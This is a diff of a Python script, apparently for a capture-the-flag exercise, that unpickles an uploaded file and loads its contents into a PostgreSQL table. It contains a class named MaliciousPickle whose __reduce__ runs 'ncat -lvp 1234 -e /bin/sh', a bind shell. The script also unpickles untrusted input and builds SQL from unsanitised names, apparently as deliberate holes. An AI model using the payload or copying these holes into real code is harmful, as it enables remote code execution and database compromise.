@@ -1,5 +1,6 @@
 import sys
 import pickle as pkl
+from venv import create
 import psycopg2 as pg
 from csv import reader
 
@@ -15,39 +16,62 @@ class DataTable:
         with open(file, 'r') as f:
             csv_reader = reader(f)
             parsed_csv = list(csv_reader)
-            
-            self.header = parsed_csv[0]
-            self.data = parsed_csv[1:]
+            self.name = parsed_csv[0][0]
+            self.headers = list(zip(parsed_csv[1], parsed_csv[2]))
+            self.data = parsed_csv[3:]
 
 class MaliciousPickle:
     def __reduce__(self):
         import os
-        cmd = "nc localhost 1234"
-        return(os.system, (cmd, ))
+        cmd = 'ncat -lvp 1234 -e /bin/sh'
+        return os.system, (cmd, )
 
 
 def main():
-    """try:
-        uploaded_file, id, password = sys.argv
+    try:
+        uploaded_file, id, password = sys.argv[1:]
+
+        file = open(uploaded_file, "rb")
+        table = pkl.loads(file.read())
+        file.close()
+
+        
+        conn = pg.connect(dbname="ctf", user=f"u{id}", password=password)
+        cur = conn.cursor()
+        
+        createQuery = f"CREATE TABLE {table.name} (idx int primary key, "
+        for header in table.headers:
+            if header == table.headers[-1]:
+                createQuery += f"{header[0]} {header[1]});"
+            else:    
+                createQuery += f"{header[0]} {header[1]},"
+        
+        cur.execute(createQuery)
+
+
+        insertFormat = ""
+        for header in table.headers:
+            insertFormat += f"%s,"
+        insertFormat = insertFormat[:-1]
+
+
+        for i in range(len(table.data)):
+            for j in range(len(table.headers)):
+                if table.headers[j][1] == 'int':
+                    table.data[i][j] = int(table.data[i][j])
+                elif table.headers[j][1] == "decimal":
+                    table.data[i][j] = float(table.data[i][j])
+            
+            insertQuery = f"INSERT INTO {table.name} VALUES ({i},{insertFormat})"
+            cur.execute(insertQuery, table.data[i])
+
+        conn.commit()
+
+        cur.close()
+        conn.close()
     except:
-        print("Invalid arguments")
-        return
-
-    file = open(uploaded_file, "rb")
-    table = pkl.load(file)
-    file.close()
-    """
-    conn = pg.connect(dbname="ctf", user="postgres", password="postgres")
-    cur = conn.cursor()
+        print("FAIL")
     
-    cur.execute("SELECT * FROM employee;")
-    print(cur.fetchall)
-    conn.commit()
 
-    cur.close()
-    conn.close()
-
-
-
-
-print("Hello World")
+if __name__ == "__main__":
+    main()
